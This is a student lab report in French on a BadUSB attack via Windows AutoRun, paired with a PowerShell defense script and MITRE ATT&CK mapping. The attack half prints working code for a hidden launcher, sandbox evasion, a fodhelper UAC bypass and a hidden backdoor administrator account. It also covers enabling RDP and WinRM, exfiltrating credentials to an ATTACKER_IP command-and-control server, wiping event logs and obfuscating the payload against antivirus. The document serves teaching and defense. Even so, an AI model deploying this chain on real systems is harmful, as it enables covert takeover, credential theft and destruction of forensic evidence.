# Rapport de TP – Attaque BadUSB et Mécanismes de Défense

**Module** : Sécurité des systèmes d'information  
**Étudiant** : AMIRECHE Achraf  
**Date de remise** : Avant le 01 mai 2026  
**Dépôt** : https://github.com/AMIRECHE-ACHRAF/Projet_BadUSB_Attack

---

## Table des matières

1. [Introduction et cadre du TP](#1-introduction-et-cadre-du-tp)
2. [Architecture générale du projet](#2-architecture-générale-du-projet)
3. [Partie 1 – Conception de la charge utile BadUSB](#3-partie-1--conception-de-la-charge-utile-badusb)
   - 3.1 [Mécanisme de déclenchement automatique](#31-mécanisme-de-déclenchement-automatique)
   - 3.2 [Mécanismes anti-analyse et anti-sandbox](#32-mécanismes-anti-analyse-et-anti-sandbox)
   - 3.3 [Élévation de privilèges – Contournement UAC](#33-élévation-de-privilèges--contournement-uac)
   - 3.4 [Création du compte administrateur caché](#34-création-du-compte-administrateur-caché)
   - 3.5 [Activation de l'accès distant (RDP + WinRM)](#35-activation-de-laccès-distant-rdp--winrm)
   - 3.6 [Collecte d'informations et exfiltration](#36-collecte-dinformations-et-exfiltration)
   - 3.7 [Effacement des traces](#37-effacement-des-traces)
   - 3.8 [Version obfusquée du payload](#38-version-obfusquée-du-payload)
   - 3.9 [Serveur C2 (Command & Control)](#39-serveur-c2-command--control)
4. [Partie 2 – Script de défense](#4-partie-2--script-de-défense)
   - 4.1 [Durcissement initial de la machine](#41-durcissement-initial-de-la-machine)
   - 4.2 [Désactivation de l'AutoRun/AutoPlay](#42-désactivation-de-lautorunautoplay)
   - 4.3 [Activation de la journalisation PowerShell](#43-activation-de-la-journalisation-powershell)
   - 4.4 [Surveillance WMI des insertions USB](#44-surveillance-wmi-des-insertions-usb)
   - 4.5 [Surveillance des créations de comptes locaux](#45-surveillance-des-créations-de-comptes-locaux)
   - 4.6 [Surveillance des modifications RDP et WinRM](#46-surveillance-des-modifications-rdp-et-winrm)
   - 4.7 [Surveillance des processus PowerShell cachés](#47-surveillance-des-processus-powershell-cachés)
5. [Procédure de démonstration](#5-procédure-de-démonstration)
6. [Analyse de correspondance avec les exigences du TP](#6-analyse-de-correspondance-avec-les-exigences-du-tp)
7. [Références techniques et MITRE ATT&CK](#7-références-techniques-et-mitre-attck)
8. [Conclusion](#8-conclusion)

---

## 1. Introduction et cadre du TP

Ce TP a pour objectif de comprendre et de mettre en pratique les mécanismes d'attaque par support USB malveillant (*BadUSB*) ainsi que les contre-mesures défensives associées. Le travail est divisé en deux parties complémentaires :

- **Partie 1** : Conception et développement d'un code malveillant capable de prendre le contrôle d'une machine Windows 10/11 en moins de 15 secondes, uniquement par l'insertion d'une clé USB ordinaire, sans aucune interaction de l'utilisateur.
- **Partie 2** : Conception et développement d'un script de défense permettant d'empêcher ce type d'attaque de fonctionner sur une machine.

> **Note éthique et légale** : L'ensemble du travail présenté ici est réalisé dans un cadre strictement pédagogique, sur des machines de test dédiées, avec l'accord de l'encadrant. L'usage de ce code en dehors de ce contexte est illégal.

### Contraintes respectées

| Contrainte du sujet | Solution adoptée |
|---------------------|-----------------|
| Déclenchement automatique, sans interaction utilisateur | AutoRun via `autorun.inf` + `launcher.vbs` (machine cible préparée avec `setup_target.ps1`) |
| Support de stockage USB ordinaire (flash disk standard) | Aucun matériel spécifique (pas de Rubber Ducky, pas de microcontrôleur) |
| Émulation clavier (BadUSB) interdite | Non utilisée ; exploitation d'AutoRun Windows |
| Transmission des informations via canal réseau réel | HTTP POST JSON vers un serveur Flask (canal réseau réel) |
| Script de défense lancé à la demande du testeur | `defense.ps1` nécessite une exécution manuelle explicite |

---

## 2. Architecture générale du projet

```
Projet_BadUSB_Attack/
├── partie1/
│   ├── payload/
│   │   ├── autorun.inf           # Fichier de déclenchement AutoRun
│   │   ├── launcher.vbs          # Lanceur VBScript silencieux
│   │   ├── payload.ps1           # Charge utile principale (version lisible)
│   │   ├── payload_obfusque.ps1  # Version obfusquée (évasion antivirus)
│   │   └── setup_target.ps1      # Préparation machine cible (réactivation AutoRun)
│   └── serveur_c2/
│       ├── server.py             # Serveur C2 Flask (côté attaquant)
│       └── requirements.txt      # Dépendances Python
└── partie2/
    └── defense.ps1               # Script de défense (côté défenseur)
```

### Schéma de flux de l'attaque

```
[Clé USB insérée]
       │
       ▼
[Windows lit autorun.inf]
       │
       ▼
[launcher.vbs exécuté par Windows]
       │  (WindowStyle Hidden, sans fenêtre)
       ▼
[payload.ps1 lancé via PowerShell masqué]
       │
       ├─► Anti-analyse → quitte si environnement suspect
       │
       ├─► UAC Bypass (fodhelper) → droits admin obtenus
       │
       ├─► Création compte admin caché (svc_XXXXXX)
       │
       ├─► Activation RDP + WinRM + règles pare-feu
       │
       ├─► Collecte IP publique / locale / infos système
       │
       ├─► HTTP POST JSON ──────────────► [Serveur C2 Flask]
       │                                         │
       │                                         ▼
       │                                  /status (tableau de bord)
       │                                  collected_targets.json
       │
       └─► Effacement des journaux / historique PS / Prefetch

[Clé USB retirée] ← tout cela en < 15 secondes
```

---

## 3. Partie 1 – Conception de la charge utile BadUSB

### 3.1 Mécanisme de déclenchement automatique

Le déclenchement repose sur la fonctionnalité **AutoRun** de Windows, activée via la clé de registre `NoDriveTypeAutoRun = 0x00`. Le déploiement se fait en deux étapes :

#### Étape A – Préparation de la machine cible (`setup_target.ps1`)

Ce script est exécuté **une fois** sur la machine cible par l'encadrant ou l'étudiant avant la démonstration. Il remet la machine dans l'état de configuration qui exploite la vulnérabilité AutoRun (MITRE ATT&CK T1091) :

| Action | Détail technique |
|---|---|
| `NoDriveTypeAutoRun = 0x00` | Réactive AutoRun pour tous les lecteurs dans `HKLM` et `HKCU` |
| Suppression du handler AutoPlay | Efface `StorageOnArrival` pour que `autorun.inf` soit prioritaire |
| Service `ShellHWDetection` | Redémarre le service requis pour la détection AutoRun |
| Windows Defender désactivé | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| Redémarrage Explorateur | Applique les changements sans reboot complet |

```powershell
# Exécuter une fois sur la machine cible (en tant qu'Administrateur)
powershell -ExecutionPolicy Bypass -File setup_target.ps1
```

#### Étape B – Insertion de la clé USB

Une fois la machine cible préparée, l'insertion de la clé USB déclenche automatiquement la chaîne d'exécution :

**Fichier `autorun.inf`** (racine de la clé USB) :

```ini
[autorun]
open=launcher.vbs
icon=shell32.dll,8
label=USB Stockage
```

La directive `open=launcher.vbs` est la seule nécessaire : dès l'insertion, Windows lit `autorun.inf` et exécute `launcher.vbs` **sans aucune interaction de l'utilisateur**.

**Fichier `launcher.vbs`** :

```vbscript
sCmd = "powershell.exe -WindowStyle Hidden -NonInteractive " & _
       "-ExecutionPolicy Bypass -NoProfile -NoLogo " & _
       "-File """ & sPayload & """"
oShell.Run sCmd, 0, False
```

Ce script VBScript :
- Reconstruit le chemin absolu vers `payload.ps1` à partir de sa propre position (racine de la clé USB), ce qui fonctionne quelle que soit la lettre de lecteur attribuée.
- Lance PowerShell avec `WindowStyle Hidden` et `bShowWindow=0` : **aucune fenêtre n'apparaît**.
- Utilise `bWaitOnReturn=False` : le lancement est **asynchrone**, le script VBS se termine immédiatement.
- Bypasse la politique d'exécution PowerShell (`ExecutionPolicy Bypass`).

### 3.2 Mécanismes anti-analyse et anti-sandbox

Avant toute action malveillante, le payload vérifie si l'environnement d'exécution est un environnement d'analyse (machine virtuelle, sandbox, débogueur). Si l'une des conditions est remplie, le script se termine silencieusement.

**Six vérifications sont effectuées :**

| Vérification | Détail technique |
|---|---|
| **Processus hyperviseurs** | Présence de `vmtoolsd`, `vmwaretray`, `vmwareuser`, `vboxservice`, `vboxtray`, `vmware-vmx`, etc. |
| **Outils d'analyse** | Présence de `procmon`, `wireshark`, `fiddler`, `x64dbg`, `ollydbg`, `ida`, `pestudio`, `windbg`, etc. |
| **RAM insuffisante** | Moins de 2 Go de RAM (seuil caractéristique des sandboxes automatisées) |
| **CPU insuffisant** | Moins de 2 cœurs logiques |
| **Espace disque insuffisant** | Moins de 50 Go de stockage total |
| **Clés de registre VM** | Présence de `HKLM:\SOFTWARE\VMware, Inc.\VMware Tools` ou `HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions` |

Une **pause de 800 millisecondes** est également introduite après la vérification pour contourner les analyses comportementales dynamiques à chaud qui n'attendent pas les actions différées.

```powershell
if (Test-Sandbox) { exit }
Start-Sleep -Milliseconds 800
```

### 3.3 Élévation de privilèges – Contournement UAC

Pour créer un compte administrateur et modifier des paramètres système, des droits élevés sont nécessaires. La technique choisie est le **bypass fodhelper.exe**, référencée par MITRE ATT&CK sous l'identifiant **T1548.002**.

**Principe du bypass fodhelper :**

1. `fodhelper.exe` est un binaire Windows signé par Microsoft, qui s'auto-élève sans demander de confirmation à l'utilisateur (propriété `AutoElevate: true`).
2. Avant de lancer, il consulte la clé de registre `HKCU:\Software\Classes\ms-settings\shell\open\command`.
3. En écrivant la commande malveillante dans cette clé **avant** le lancement de fodhelper, le payload lui fait exécuter un PowerShell élevé à sa place.

```powershell
function Invoke-FodhelperBypass {
    param([string]$Command)
    $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $null = New-Item         -Path $regPath -Force
    $null = New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
    $null = Set-ItemProperty -Path $regPath -Name "(default)" -Value $Command -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    $null = Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}
```

**Points clés :**
- La clé de registre est dans `HKCU` (accessible sans droits admin), ce qui rend l'exploitation possible depuis un contexte utilisateur standard.
- La clé est **immédiatement supprimée** après l'élévation pour ne pas laisser de traces.
- Fonctionne sur Windows 10 et Windows 11 sans patch spécifique anti-fodhelper.

Si le script est déjà en contexte admin (re-lancement par fodhelper), il passe directement à la suite.

### 3.4 Création du compte administrateur caché

Une fois les droits administrateur obtenus, le payload crée un compte local aux caractéristiques suivantes :

| Caractéristique | Valeur |
|---|---|
| **Nom** | `svc_` + 6 caractères alphanumériques aléatoires (ex: `svc_xKp3mT`) |
| **Mot de passe** | 18 caractères : minuscules + majuscules + chiffres + caractères spéciaux (`!@#$%^&*()-_=+`) |
| **Expiration** | Jamais (`/expires:never`) |
| **Expiration du mot de passe** | Désactivée (`PasswordExpires=FALSE`) |
| **Groupes** | `Administrators` + `Remote Desktop Users` |
| **Visibilité** | Masqué sur l'écran de connexion Windows |

**Masquage sur l'écran de connexion :**

```powershell
$loginHideKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$null = New-ItemProperty -Path $loginHideKey -Name $backdoorUser -Value 0 -PropertyType DWORD -Force
```

La valeur `0` dans cette clé indique à Windows de **ne pas afficher ce compte** sur l'écran de connexion `winlogon`, rendant le compte invisible pour l'utilisateur légitime mais pleinement fonctionnel pour une connexion à distance.

La génération aléatoire du nom et du mot de passe garantit que l'attaquant dispose d'identifiants uniques par machine compromise, et que les signatures basées sur des noms de comptes prédéfinis ne déclenchent pas d'alerte.

### 3.5 Activation de l'accès distant (RDP + WinRM)

Deux protocoles d'accès distant sont activés en parallèle :

#### Remote Desktop Protocol (RDP)

```powershell
# Activation du serveur RDP
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
    -Name "fDenyTSConnections" -Value 0 -Force

# Désactivation de l'authentification réseau (NLA)
Set-ItemProperty `
    -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
    -Name "UserAuthentication" -Value 0 -Force

# Ouverture de la règle pare-feu intégrée
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

La désactivation de la NLA (*Network Level Authentication*) permet à l'attaquant de se connecter sans validation Kerberos, simplifiant l'accès à distance même sur des réseaux segmentés.

#### Windows Remote Management (WinRM / PowerShell distant)

```powershell
Enable-PSRemoting -Force -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
Set-Service  -Name WinRM -StartupType Automatic
Start-Service -Name WinRM
```

WinRM permet l'exécution de commandes PowerShell à distance via `Enter-PSSession` ou `Invoke-Command`, offrant un second vecteur d'accès indépendant de RDP.

#### Règle pare-feu personnalisée (tous profils réseau)

```powershell
netsh advfirewall firewall add rule name="BackdoorRemoteAccess" `
    protocol=TCP dir=in localport=3389,5985,5986 action=allow profile=any
```

Cette règle s'applique à tous les profils réseau (domaine, privé, public), garantissant l'accessibilité y compris sur des réseaux publics ou inconnus.

### 3.6 Collecte d'informations et exfiltration

Le payload collecte les informations nécessaires à la connexion à distance et les transmet à l'attaquant via un **canal réseau réel** (HTTP).

**Données collectées :**

```json
{
  "computer_name": "DESKTOP-XXXX",
  "domain": "WORKGROUP",
  "current_user": "Utilisateur",
  "os_version": "Windows 11 Pro",
  "local_ip": "192.168.1.10",
  "public_ip": "203.0.113.45",
  "backdoor_user": "svc_xKp3mT",
  "backdoor_pass": "P@ss!R4nd0m18Kz",
  "rdp_port": 3389,
  "winrm_port": 5985,
  "timestamp": "2025-04-22 20:01:48"
}
```

**Récupération de l'IP publique** (avec trois sources de secours) :

```powershell
foreach ($svc in @("https://api.ipify.org","https://checkip.amazonaws.com","https://icanhazip.com")) {
    $publicIP = (Invoke-WebRequest -Uri $svc -UseBasicParsing -TimeoutSec 5).Content.Trim()
    if ($publicIP -match '^\d{1,3}(\.\d{1,3}){3}$') { break }
}
```

**Protocole d'exfiltration à deux niveaux :**

1. **Tentative principale** : HTTP POST avec body JSON vers `http://ATTACKER_IP:8080/collect`. C'est le canal le plus fiable et le plus lisible côté serveur.
2. **Tentative de repli** : Si le POST échoue (pare-feu sortant, problème réseau transitoire), les données sont encodées en Base64 et envoyées en paramètre GET vers `http://ATTACKER_IP:8080/b64?d=<base64>`. Cette méthode peut contourner certains filtrages qui bloquent les requêtes POST.

### 3.7 Effacement des traces

La dernière étape du payload consiste à supprimer les preuves de son exécution :

| Action | Commande / Méthode |
|---|---|
| Journaux d'événements Windows | `wevtutil cl System`, `Application`, `Security`, `Windows PowerShell`, `Microsoft-Windows-PowerShell/Operational` |
| Historique PowerShell | Suppression de `ConsoleHost_history.txt` (PSReadLine) |
| Fichiers Prefetch | Suppression de `C:\Windows\Prefetch\POWERSHELL*` |
| Journalisation PS future | Désactivation de `EnableScriptBlockLogging` et `EnableTranscripting` dans la base de registre |

Ce nettoyage rend l'investigation forensique significativement plus difficile, car les principaux artéfacts numériques sont supprimés avant le retrait de la clé USB.

### 3.8 Version obfusquée du payload

Le fichier `payload_obfusque.ps1` implémente les mêmes fonctionnalités que `payload.ps1` en appliquant plusieurs techniques d'obfuscation destinées à contourner les logiciels antivirus basés sur des **signatures statiques** :

#### Technique 1 – Encodage Base64 des chaînes sensibles

Toutes les chaînes détectables (noms de processus, chemins de registre, noms de cmdlets) sont encodées en Base64 et décodées à la volée :

```powershell
function g0 { param($s) [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }

# "vmtoolsd" → "dm10b29sc2Q="
(g0 "dm10b29sc2Q=")

# "HKCU:\Software\Classes\ms-settings\shell\open\command"
# → "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQ="
$_rp = (g0 "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQ=")
```

#### Technique 2 – Concaténation de chaînes pour briser les signatures

Les noms de cmdlets sont coupés en fragments qui, une fois concaténés, reconstituent la commande réelle :

```powershell
function g1 { param($a,$b) "$a$b" }

# "Get-Process"    → &(g1 "Get-" "Process")
# "New-Item"       → &(g1 "New-" "Item")
# "Enable-PSRemoting" → &(g1 "Enable-PSR" "emoting")
# "Invoke-WebRequest" → &(g1 "Invoke-Web" "Request")
```

Un antivirus cherchant la signature littérale `Get-Process` ou `Enable-PSRemoting` ne la trouvera pas dans le fichier.

#### Technique 3 – Noms de variables non descriptifs

Toutes les variables portent des noms courts et inintelligibles (`$_vp`, `$_r`, `$_ia`, `$_sp`, `$_cmd`, `$_u`, `$_pw`, etc.), rendant la lecture et l'analyse statique du code difficile.

#### Technique 4 – Accès aux propriétés via chaînes encodées

Les noms de propriétés et de classes WMI sont également encodés :

```powershell
# "Win32_ComputerSystem" → "V2luMzJfQ29tcHV0ZXJTeXN0ZW0="
(g0 "V2luMzJfQ29tcHV0ZXJTeXN0ZW0=")

# "fDenyTSConnections" → "ZkRlbnlUU0Nvbm5lY3Rpb25z"
(g0 "ZkRlbnlUU0Nvbm5lY3Rpb25z")
```

### 3.9 Serveur C2 (Command & Control)

Le serveur C2 est un serveur web Python/Flask léger qui s'exécute sur la machine de l'attaquant et reçoit les données exfiltrées par le payload.

#### Endpoints exposés

| Endpoint | Méthode HTTP | Rôle |
|---|---|---|
| `/` | GET | Page neutre (ne révèle rien) |
| `/collect` | POST | Reçoit le JSON exfiltré, le persiste |
| `/b64?d=<data>` | GET | Méthode de repli Base64 |
| `/status` | GET | Tableau de bord HTML des cibles compromises |

#### Fonctionnement

```python
def save_target(entry: dict) -> None:
    targets = load_targets()
    entry.setdefault("server_received", datetime.now(timezone.utc).isoformat())
    entry.setdefault("client_ip", request.remote_addr)
    targets.append(entry)
    with open(DATA_FILE, "w", encoding="utf-8") as fh:
        json.dump(targets, fh, indent=2, ensure_ascii=False)
```

- Les données reçues sont **persistées** dans `logs/collected_targets.json`.
- Un **horodatage serveur** (UTC) est ajouté indépendamment du timestamp fourni par le client.
- L'**adresse IP du client** (machine compromise) est également enregistrée.
- Les erreurs serveur ne retournent **pas de stack trace** dans les réponses HTTP (sécurité de l'implémentation).

#### Tableau de bord HTML (`/status`)

Le tableau de bord présente, pour chaque machine compromise :
- Horodatage de réception, hostname, domaine, version OS
- IP locale et IP publique
- Nom d'utilisateur et mot de passe backdoor
- Ports RDP et WinRM
- IP du client C2

#### Démarrage du serveur

```bash
pip install -r requirements.txt
python server.py --host 0.0.0.0 --port 8080
```

---

## 4. Partie 2 – Script de défense

Le script `defense.ps1` est conçu pour **empêcher** les attaques de type BadUSB de fonctionner sur la machine cible. Il est lancé manuellement par le testeur avec des droits administrateur :

```powershell
powershell -ExecutionPolicy Bypass -File defense.ps1
```

Il combine **durcissement de la configuration** et **surveillance active en temps réel** via des abonnements WMI (*Windows Management Instrumentation*).

### 4.1 Durcissement initial de la machine

Dès le démarrage, le script vérifie et corrige l'état de la machine :

- **RDP** : si `fDenyTSConnections = 0` (RDP activé), il est immédiatement désactivé et la règle pare-feu correspondante est bloquée.
- **WinRM** : si le service est en cours d'exécution, il est arrêté et mis en démarrage désactivé.
- **Règle pare-feu backdoor** : la règle nommée `BackdoorRemoteAccess` (créée par le payload) est supprimée si elle existe.
- **Comptes cachés** : les entrées dans `HKLM:\...\SpecialAccounts\UserList` sont énumérées ; tout compte caché trouvé est immédiatement désactivé.

### 4.2 Désactivation de l'AutoRun/AutoPlay

```powershell
# Niveau machine
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
    -Name "NoDriveTypeAutoRun" -Value 0xFF -Type DWord -Force
Set-ItemProperty -Path "HKLM:\...\Explorer" -Name "NoAutorun" -Value 1 -Type DWord -Force

# Niveau utilisateur courant
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
    -Name "NoDriveTypeAutoRun" -Value 0xFF -Type DWord -Force

# Arrêt du service AutoPlay
Stop-Service -Name ShellHWDetection -Force
Set-Service  -Name ShellHWDetection -StartupType Disabled
```

La valeur `0xFF` pour `NoDriveTypeAutoRun` **désactive l'AutoRun pour tous les types de lecteurs** (amovibles, réseau, CD-ROM, etc.). Sans AutoRun actif, `autorun.inf` n'est jamais lu et `launcher.vbs` n'est jamais exécuté.

### 4.3 Activation de la journalisation PowerShell

Le payload tente de désactiver les journaux PowerShell. Par précaution, le script de défense les active **en premier** et les maintient actifs :

| Journal | Clé de registre | Effet |
|---|---|---|
| **ScriptBlock Logging** | `EnableScriptBlockLogging = 1` | Enregistre chaque bloc de code PS exécuté dans l'Event Log |
| **ScriptBlock Invocation Logging** | `EnableScriptBlockInvocationLogging = 1` | Journalise même les appels de fonctions |
| **Module Logging** | `EnableModuleLogging = 1` | Journalise tous les modules PowerShell chargés |
| **Transcription** | `EnableTranscripting = 1` | Enregistre les sessions PS dans des fichiers texte sous `C:\PS_Transcripts\` |

### 4.4 Surveillance WMI des insertions USB

```powershell
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 " +
         "WHERE TargetInstance ISA 'Win32_DiskDrive'"
Register-WmiEvent -Query $query -SourceIdentifier "USBInsert" -Action { ... }
```

Dès qu'un nouveau disque est détecté (intervalle de polling WMI : 2 secondes), l'action :
1. **Journalise** l'événement (DeviceID, modèle, numéro de série).
2. **Identifie les lecteurs amovibles** montés (`DriveType = 2`).
3. **Tue automatiquement** tout processus dont le chemin d'exécution est sur un lecteur amovible.

### 4.5 Surveillance des créations de comptes locaux

```powershell
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 " +
         "WHERE TargetInstance ISA 'Win32_UserAccount'"
Register-WmiEvent -Query $query -SourceIdentifier "UserCreation" -Action { ... }
```

À chaque création d'un nouveau compte local, l'action :
1. **Journalise** le nom, le domaine et le statut du compte.
2. **Désactive immédiatement** le compte via `Disable-LocalUser`.

Cette contre-mesure bloque directement l'étape 3 du payload (création du compte backdoor).

### 4.6 Surveillance des modifications RDP et WinRM

Un timer PowerShell (intervalle : 5 secondes) vérifie en permanence :
- La valeur de `fDenyTSConnections` : si elle passe à `0` (RDP activé), elle est rétablie à `1` et un log d'alerte est généré.
- Le type de démarrage du service WinRM : si il passe à `Automatic` ou `Manual`, le service est arrêté et repassé en `Disabled`.

```powershell
$timer           = New-Object System.Timers.Timer
$timer.Interval  = 5000
$timer.AutoReset = $true
Register-ObjectEvent -InputObject $timer -EventName Elapsed -SourceIdentifier "RDPWinRMTimer" -Action $timerAction
$timer.Start()
```

### 4.7 Surveillance des processus PowerShell cachés

```powershell
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 " +
         "WHERE TargetInstance ISA 'Win32_Process' AND " +
         "TargetInstance.Name = 'powershell.exe'"
```

Chaque nouveau processus `powershell.exe` est inspecté. Sa ligne de commande est analysée pour détecter les indicateurs de comportement malveillant :

| Indicateur | Signification |
|---|---|
| `-WindowStyle Hidden` | Exécution masquée |
| `-NonInteractive` | Exécution non interactive (script automatisé) |
| `-EncodedCommand` | Commande encodée en Base64 (obfuscation) |
| `-ExecutionPolicy Bypass` | Contournement de la politique d'exécution |
| `-NoProfile.*-File` | Lancement direct d'un fichier script |

Si plusieurs indicateurs sont présents simultanément, le processus est considéré comme suspect et **immédiatement terminé** via `Stop-Process`.

---

## 5. Procédure de démonstration

### Environnement de test

| Rôle | Machine | OS |
|---|---|---|
| Victime | VM 1 | Windows 10/11 Pro |
| Attaquant | Machine hôte ou VM 2 | Linux / Windows (serveur C2) |

### Étapes de démonstration – Attaque (Partie 1)

#### Étape A – Préparation de la machine cible (une fois, avant la démo)

1. Sur la machine victime (VM 1), ouvrir PowerShell **en tant qu'Administrateur**.
2. Exécuter `setup_target.ps1` :
   ```powershell
   powershell -ExecutionPolicy Bypass -File setup_target.ps1
   ```
   Le script réactive AutoRun, démarre `ShellHWDetection` et désactive Defender.
   Un message de confirmation s'affiche : *« Machine cible prête pour la démonstration »*.

#### Étape B – Préparation de la clé USB

1. Copier `autorun.inf`, `launcher.vbs` et `payload.ps1` à la racine de la clé USB.
2. Remplacer `ATTACKER_IP` dans `payload.ps1` par l'IP réelle du serveur C2.

#### Étape C – Démarrage du serveur C2

```bash
cd partie1/serveur_c2
pip install -r requirements.txt
python server.py --host 0.0.0.0 --port 8080
```

#### Étape D – Démonstration

1. **Insertion de la clé USB** dans la machine victime (VM 1).
2. **Observation** : dans les 15 secondes suivant l'insertion, sans aucun clic :
   - Aucune fenêtre n'apparaît sur la machine victime.
   - Le serveur C2 affiche dans sa console : `Nouvelle cible : DESKTOP-XXXX ...`
   - La page `http://ATTACKER_IP:8080/status` affiche les identifiants reçus.

3. **Retrait de la clé USB** après ≤ 15 secondes.

4. **Vérification de la compromission** :
   ```
   # Connexion RDP
   mstsc /v:<IP_PUBLIQUE>:3389
   # → Entrer svc_XXXXXX / <mot de passe reçu>
   
   # Connexion PowerShell distante
   Enter-PSSession -ComputerName <IP_PUBLIQUE> -Credential (Get-Credential)
   ```

### Étapes de démonstration – Défense (Partie 2)

1. **Lancement du script de défense** sur la machine à protéger :
   ```powershell
   powershell -ExecutionPolicy Bypass -File defense.ps1
   ```

2. **Tentative d'insertion de la clé USB malveillante** : le script détecte l'insertion, tue les processus lancés depuis le lecteur amovible, et bloque les tentatives de modification RDP/WinRM.

3. **Observation des logs** générés dans `defense_log_YYYYMMDD_HHMMSS.txt`.

---

## 6. Analyse de correspondance avec les exigences du TP

| Exigence du sujet | Statut | Solution technique |
|---|:---:|---|
| Déclenchement sans interaction utilisateur | ✅ | `autorun.inf` + `launcher.vbs` (WindowStyle=0, async) sur machine préparée avec `setup_target.ps1` |
| Flash disk ordinaire, sans matériel spécifique | ✅ | Clé USB standard, aucun microcontrôleur |
| Émulation clavier interdite – non utilisée | ✅ | Exploitation d'AutoRun uniquement |
| Créer un compte administrateur | ✅ | `net user svc_XXXX ... /add` + `net localgroup Administrators` |
| Reconfigurer pour accès distant | ✅ | RDP (`fDenyTSConnections=0`) + WinRM (`Enable-PSRemoting`) |
| Transmettre les informations à l'attaquant | ✅ | HTTP POST JSON vers serveur C2 Flask (canal réseau réel) |
| Mécanismes de défense et contournement | ✅ | Anti-sandbox (6 vérifications), UAC bypass fodhelper, obfuscation, nettoyage journaux |
| Script de défense à la demande du testeur | ✅ | `defense.ps1` (exécution manuelle requise) |
| Script empêche les scripts malveillants d'opérer | ✅ | 7 mécanismes : AutoRun off, WMI monitors, timer RDP/WinRM |
| Transmission via canal réseau réel | ✅ | HTTP sur socket TCP réel (Flask server.py) |

---

## 7. Références techniques et MITRE ATT&CK

| Technique | ID MITRE | Description |
|---|---|---|
| Replication Through Removable Media | T1091 | Utilisation d'AutoRun pour déclencher le payload |
| Exfiltration Over C2 Channel | T1041 | Envoi des données via HTTP POST vers le serveur C2 |
| Bypass User Account Control: fodhelper | T1548.002 | Élévation silencieuse via fodhelper.exe |
| Valid Accounts: Local Accounts | T1078.003 | Compte backdoor local avec droits admin |
| Remote Services: Remote Desktop Protocol | T1021.001 | Activation de RDP pour accès distant |
| Remote Services: Windows Remote Management | T1021.006 | Activation de WinRM pour PowerShell distant |
| Command and Scripting Interpreter: PowerShell | T1059.001 | Exécution de scripts PS masqués |
| Impair Defenses: Disable or Modify Tools | T1562.001 | Désactivation journalisation PS, effacement logs |
| Indicator Removal: Clear Windows Event Logs | T1070.001 | `wevtutil cl` sur tous les journaux Windows |
| Obfuscated Files or Information | T1027 | Encodage Base64 + concaténation dans version obfusquée |
| Virtualization/Sandbox Evasion | T1497 | Détection VM/sandbox (RAM, CPU, registre, processus) |

---

## 8. Conclusion

Ce TP a permis de concevoir et d'implémenter un vecteur d'attaque BadUSB complet et fonctionnel sur Windows 10/11, ainsi qu'un script de défense correspondant. Les points clés à retenir sont les suivants :

**Sur l'attaque :**
- La surface d'attaque via AutoRun existe toujours sur Windows 10/11 lorsque la fonctionnalité n'est pas explicitement désactivée par la politique de sécurité.
- Un payload de 270 lignes de PowerShell suffit à compromettre complètement une machine : création de compte, accès distant, exfiltration et effacement des traces, le tout en moins de 15 secondes.
- L'obfuscation par encodage Base64 et concaténation de chaînes est une technique éprouvée pour contourner les antivirus basés sur des signatures statiques.

**Sur la défense :**
- La **désactivation d'AutoRun/AutoPlay** est la contre-mesure la plus efficace car elle rompt la chaîne d'infection dès la première étape.
- La **journalisation PowerShell** (ScriptBlock Logging) est un mécanisme de détection puissant pour les environnements SOC.
- La **surveillance WMI en temps réel** permet une réponse quasi-immédiate aux tentatives de compromission (< 2 secondes de délai).
- Aucune contre-mesure unique n'est suffisante ; c'est la **défense en profondeur** (plusieurs couches indépendantes) qui garantit une protection robuste.

**Limites identifiées :**
- Le mécanisme AutoRun peut être contourné par d'autres vecteurs (DLL hijacking, LNK files, injection dans des processus auto-démarrés) non traités dans ce TP.
- Le serveur C2 implémente uniquement HTTP ; un déploiement réel utiliserait HTTPS avec un certificat valide pour éviter l'inspection TLS par les proxies d'entreprise.
- Le script de défense suppose que le testeur dispose déjà des droits admin sur la machine ; sur une machine verrouillée, le déploiement de la défense nécessiterait une GPO ou une solution de déploiement centralisé.
